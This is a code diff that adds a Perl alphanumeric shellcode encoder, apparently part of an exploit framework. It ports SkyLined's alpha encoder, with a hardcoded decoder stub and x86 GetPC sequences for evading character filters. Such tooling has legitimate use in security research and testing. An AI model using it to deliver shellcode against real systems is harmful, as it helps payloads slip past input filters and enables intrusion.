@@ -93,6 +93,149 @@ sub EncodeFnstenv
 
 
 #
+# This code is a port of Skylined's awesome alpha encoder
+#
+sub EncodeAlphaNum {
+    # $opts->{'win32'} == use win32 getpc and decode
+    my ($rawshell, $xbadc, $opts) = @_;
+
+    # the decoder in all its glory (hardcoded for 9 byte baseaddr)
+    my $decoder = 'VTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJOM';
+    my $encoded;
+    
+    my $allowed = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXY";
+    
+    # first check to see if the encoder/alphabet is allowed 
+    if ( Pex::Utils::CharsInBuffer($allowed.$decoder."Z", $xbadc) )
+    {
+        print "Encoder failed: restricted character in decoder or alphabet\n";
+        return;
+    }
+    
+    # the different places where our baseaddr is stored by getpc
+    my %baseaddr;
+    $baseaddr{'eax'}    = 'PZJJJJJRY';
+    $baseaddr{'ebx'}    = 'SZJJJJJRY';
+    $baseaddr{'ecx'}    = 'OIIIIIIQZ';
+    $baseaddr{'edx'}    = 'OJJJJJJRY';
+    $baseaddr{'esp'}    = 'TZJJJJJRY';
+    $baseaddr{'ebp'}    = 'UZJJJJJRY';
+    $baseaddr{'esi'}    = 'VZJJJJJRY';
+    $baseaddr{'edi'}    = 'WZJJJJJRY';
+    $baseaddr{'[esp]'}  = 'OZJJJJJRY';
+    $baseaddr{'win32'}  = $baseaddr{'ecx'};
+
+    # jump to the byte before the end of this, so the byte following
+    # this becomes the second byte of the new instruction we jump to
+    # call4 getpc's use a push [reg] second byte, then pop twice
+    my $call4 = "\xe8\xff\xff\xff\xff";
+    
+    # this is a the extensible getpc array
+    my $getpc =
+    {
+        'eax'   =>
+        [
+            $call4. "0XX",
+        ],
+        'ebx',
+        [
+            $call4. "3[[",
+        ],    
+        'ecx',
+        [
+            $call4. "1YY",
+        ],
+        'edx',
+        [
+            $call4. "2ZZ",
+        ],
+        'esp',
+        [
+            $call4. "\\\\",
+        ], 
+        'ebp',
+        [
+            $call4. "]",
+        ],
+        'esi',
+        [
+            $call4. "^",
+        ],
+        'edi',
+        [
+            $call4. "_",
+        ],              
+        '[esp]' =>
+        [
+            $call4,
+        ],
+        'win32' =>
+        [
+            'VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089',
+        ],
+    };
+
+    # if this we are encoding this for win32, try the easy way first
+    if (exists($opts->{'win32'}) && ! Pex::Utils::CharsInBuffer($baseaddr{'win32'}, $xbadc))
+    {
+        foreach my $pc (@{ $getpc->{'win32'} })
+        {
+            if (! Pex::Utils::CharsInBuffer($pc, $xbadc))
+            {
+                $encoded = $pc . $baseaddr{'win32'};
+                last;
+            }
+        }
+    }
+
+    if (! $encoded)
+    {
+        foreach my $meth (keys(%baseaddr))
+        {
+            last if $encoded; 
+            next if Pex::Utils::CharsInBuffer($baseaddr{$meth}, $xbadc);
+            foreach my $pc (@{ $getpc->{$meth}})
+            {
+                if (! Pex::Utils::CharsInBuffer($pc, $xbadc))
+                {
+                    $encoded = $pc . $baseaddr{$meth};
+                }
+            }
+        }
+    }
+
+    if (! $encoded)
+    {
+        print "Encoder failed: restricted character in all getpc/baseaddr options\n";
+        return;
+    }
+
+
+    my @alphanum = split(//, $allowed);
+    my (@lonibs, @hinibs);
+
+    foreach my $x (0 .. 255)  {
+    foreach my $y (@alphanum) {
+        $lonibs[$x] = (($x & 0x0f) ^ 0x41) + 1;
+
+        if (($x & 0xf0) >> 4 == (ord($y) & 0x0f))
+        {
+            push @{$hinibs[$x]}, $y;
+        }
+    } }
+
+
+    foreach (split(//, $rawshell))
+    {
+        my $nibL = chr($lonibs[ord($_)]);
+        my $nibH = @{$hinibs[ord($_)]}[ rand @{$hinibs[ord($_)]} ];
+        $encoded .= $nibL . $nibH;
+    }
+    $encoded .= "Z";
+    return($encoded);
+}
+
+#
 # These are the current x86 decoders, all of them are static
 # at the moment, but tend to meet the needs of most exploits.
 #
